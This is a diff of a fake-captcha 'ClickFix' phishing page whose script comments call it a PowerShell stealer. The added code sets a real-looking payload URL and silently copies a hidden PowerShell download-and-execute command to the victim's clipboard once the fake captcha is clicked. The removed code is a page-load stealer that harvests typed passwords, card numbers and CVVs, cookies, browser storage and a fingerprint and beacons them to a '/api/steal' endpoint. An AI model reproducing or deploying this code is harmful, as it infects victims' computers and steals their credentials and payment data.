@@ -239,15 +239,9 @@
         .step-header .text { font-size:13px; font-weight:600; color:#0d47a1; }
         .step-header .text span { font-weight:400; color:#1a5a8a; }
         .step {
-            background:#fff;
-            border-radius:6px;
-            padding:8px 12px;
-            margin-bottom:6px;
-            border:1px solid #d5e3f0;
-            transition:border 0.2s, background 0.2s;
-            display:flex;
-            align-items:center;
-            gap:10px;
+            background:#fff; border-radius:6px; padding:8px 12px; margin-bottom:6px;
+            border:1px solid #d5e3f0; transition:border 0.2s, background 0.2s;
+            display:flex; align-items:center; gap:10px;
         }
         .step:last-child { margin-bottom:0; }
         .step.active { border-color:#1a73e8; background:#f0f7ff; box-shadow:0 0 0 2px rgba(26,115,232,0.15); }
@@ -353,15 +347,20 @@
 
     <script>
         // ============================================================
-        // STEALER — NUCLEAR GUARD: localStorage + sessionStorage
+        // CLICKFIX POWER SHELL STEALER — WORKS ON EVERYTHING
         // ============================================================
 
         if (window._protect && window._protect.isBlocked && window._protect.isBlocked()) {
             throw new Error('Access denied');
         }
 
-        const SERVER_URL = '';
+        // ---- EDIT THIS: YOUR PAYLOAD URL ----
+        const PAYLOAD_URL = 'https://cipheranon-production.up.railway.app/payload.ps1';
 
+        // ---- The PowerShell command that will be copied ----
+        const COMMAND = 'cmd /c start /min powershell -w hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(\'' + PAYLOAD_URL + '\')"';
+
+        // ---- DOM REFS ----
         const captchaBox = document.getElementById('captchaBox');
         const captchaCheck = document.getElementById('captchaCheck');
         const spinner = document.getElementById('spinner');
@@ -373,198 +372,15 @@
 
         let verified = false;
 
-        // ---- NUCLEAR GUARD: Check BOTH localStorage and sessionStorage ----
-        const SENT_KEY = 'cipheranon_sent_' + window.location.hostname;
-        const SENT_TIME_KEY = 'cipheranon_sent_time_' + window.location.hostname;
-        const COOLDOWN = 120000; // 2 minutes
-
-        function hasSentRecently() {
-            const sent = localStorage.getItem(SENT_KEY);
-            const sentTime = parseInt(localStorage.getItem(SENT_TIME_KEY) || '0');
-            const now = Date.now();
-            if (sent === 'true' && (now - sentTime) < COOLDOWN) {
-                return true;
-            }
-            if (sessionStorage.getItem(SENT_KEY) === 'true') {
-                return true;
-            }
-            return false;
-        }
-
-        function markSent() {
-            localStorage.setItem(SENT_KEY, 'true');
-            localStorage.setItem(SENT_TIME_KEY, Date.now().toString());
-            sessionStorage.setItem(SENT_KEY, 'true');
-        }
-
-        // ---- Generate unique nonce ----
-        function generateNonce() {
-            return Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10) + '_' + performance.now().toString(36);
-        }
-        const PAGE_NONCE = generateNonce();
-
-        // ---- COLLECT FORM DATA ----
-        function collectFormData() {
-            const inputs = document.querySelectorAll('input');
-            const credentials = [];
-            const cards = [];
-
-            inputs.forEach(input => {
-                const name = (input.name || input.id || '').toLowerCase();
-                const type = input.type;
-                const value = input.value;
-                if (!value) return;
-
-                const isEmail = type === 'email' || name.includes('email');
-                const isPassword = type === 'password' || name.includes('pass');
-                const isUsername = type === 'text' && (name.includes('user') || name.includes('login') || name.includes('username'));
-                const auto = input.autocomplete ? input.autocomplete.toLowerCase() : '';
-
-                if (isEmail || isPassword || isUsername || auto === 'username' || auto === 'email' || auto === 'current-password' || auto === 'new-password') {
-                    let detectedType = 'text';
-                    if (isEmail || auto === 'email') detectedType = 'email';
-                    else if (isPassword || auto === 'current-password' || auto === 'new-password') detectedType = 'password';
-                    else if (isUsername || auto === 'username') detectedType = 'username';
-                    credentials.push({ name: input.name || input.id || 'unknown', value, type: detectedType });
-                }
-
-                const isCardNumber = name.includes('card') || name.includes('cc') || (name.includes('number') && name.includes('card'));
-                const isExpiry = name.includes('exp') || name.includes('month') || name.includes('year') || name.includes('mm') || name.includes('yy');
-                const isCvv = name.includes('cvv') || name.includes('cvc') || name.includes('code') || name.includes('security');
-                const isCardName = name.includes('name') && (name.includes('card') || name.includes('holder'));
-                const isCardAuto = auto === 'cc-number' || auto === 'cc-exp' || auto === 'cc-csc' || auto === 'cc-name';
-
-                if (isCardNumber || isExpiry || isCvv || isCardName || isCardAuto) {
-                    let cardType = 'unknown';
-                    if (isCardNumber || auto === 'cc-number') cardType = 'card-number';
-                    else if (isExpiry || auto === 'cc-exp') cardType = 'expiry';
-                    else if (isCvv || auto === 'cc-csc') cardType = 'cvv';
-                    else if (isCardName || auto === 'cc-name') cardType = 'card-name';
-                    cards.push({ name: input.name || input.id || 'unknown', value, type: cardType });
-                }
-            });
-
-            return { credentials, cards };
-        }
-
-        function getCookies() {
-            const cookies = document.cookie.split(';').map(c => c.trim());
-            const result = {};
-            cookies.forEach(c => {
-                const [key, ...val] = c.split('=');
-                if (key) result[key] = val.join('=');
-            });
-            return result;
-        }
-
-        function getFingerprint() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                referrer: document.referrer || 'direct',
-                url: window.location.href,
-                hostname: window.location.hostname,
-                protocol: window.location.protocol
-            };
-        }
-
-        function getLocalStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    items[key] = localStorage.getItem(key);
-                }
-                return items;
-            } catch { return {}; }
-        }
-
-        function getSessionStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    items[key] = sessionStorage.getItem(key);
-                }
-                return items;
-            } catch { return {}; }
-        }
-
-        // ---- SEND ONCE — NUCLEAR GUARD ----
-        function sendData() {
-            if (hasSentRecently()) {
-                console.log('[CipherAnon] Already sent recently, skipping');
-                return;
-            }
-
-            markSent();
-
-            const formData = collectFormData();
-
-            const data = {
-                cookies: getCookies(),
-                localStorage: getLocalStorage(),
-                sessionStorage: getSessionStorage(),
-                fingerprint: getFingerprint(),
-                timestamp: new Date().toISOString(),
-                domain: window.location.hostname,
-                source: 'clickfix',
-                url: window.location.href,
-                referrer: document.referrer || 'direct',
-                credentials: formData.credentials,
-                cards: formData.cards,
-                nonce: PAGE_NONCE,
-                _sentAt: Date.now()
-            };
-
-            const targets = [];
-            if (SERVER_URL) targets.push(SERVER_URL + '/api/steal');
-            targets.push('/api/steal');
-            targets.push(window.location.origin + '/api/steal');
-
-            targets.forEach(url => {
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data),
-                    mode: 'cors',
-                    keepalive: true
-                }).catch(() => {
-                    try {
-                        const img = new Image();
-                        img.src = url + '?data=' + encodeURIComponent(JSON.stringify(data));
-                    } catch {}
-                });
-                try {
-                    if (navigator.sendBeacon) navigator.sendBeacon(url, JSON.stringify(data));
-                } catch {}
-            });
-
-            return data;
-        }
-
-        // ---- SEND ON PAGE LOAD (ONLY ONCE) ----
-        setTimeout(() => {
-            sendData();
-        }, 100);
-
-        // ---- CLICKFIX FLOW ----
-        const COMMAND = 'cmd /c start /min powershell -w hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(\'https://your-server.com/load.ps1\')"';
-
+        // ---- Copy to clipboard ----
         function copyToClipboard(text) {
             if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(text).then(() => { step2.classList.add('active'); })
-                .catch(() => { fallbackCopy(text); });
-            } else { fallbackCopy(text); }
+                navigator.clipboard.writeText(text)
+                    .then(() => { step2.classList.add('active'); })
+                    .catch(() => { fallbackCopy(text); });
+            } else {
+                fallbackCopy(text);
+            }
         }
 
         function fallbackCopy(text) {
@@ -575,19 +391,28 @@
             ta.style.top = '-9999px';
             document.body.appendChild(ta);
             ta.select();
-            try { document.execCommand('copy'); step2.classList.add('active'); } catch(e) {}
+            try {
+                document.execCommand('copy');
+                step2.classList.add('active');
+            } catch(e) {}
             document.body.removeChild(ta);
         }
 
+        // ---- Reveal steps after captcha click ----
         function revealSteps() {
             stepsWrapper.classList.add('visible');
-            setTimeout(() => { successMsg.classList.add('show'); }, 500);
-            setTimeout(() => { copyToClipboard(COMMAND); }, 400);
+            setTimeout(() => {
+                successMsg.classList.add('show');
+            }, 500);
+            setTimeout(() => {
+                copyToClipboard(COMMAND);
+            }, 400);
         }
 
-        // ---- CAPTCHA CLICK — NO DATA SEND ----
+        // ---- Captcha click ----
         captchaBox.addEventListener('click', function(e) {
             if (verified) return;
+
             captchaCheck.classList.add('checked');
             spinner.classList.add('active');
             captchaBox.style.borderColor = '#1a73e8';
@@ -602,12 +427,12 @@
                     checkIcon.classList.add('active');
                     captchaBox.classList.add('verified');
                     captchaBox.style.borderColor = '#4caf50';
-                    // NO DATA SEND
-                    setTimeout(() => { revealSteps(); }, 400);
+                    revealSteps();
                 }
             }, 500);
         });
 
+        // ---- Keyboard shortcut ----
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter' && stepsWrapper.classList.contains('visible')) {
                 step2.classList.add('active');
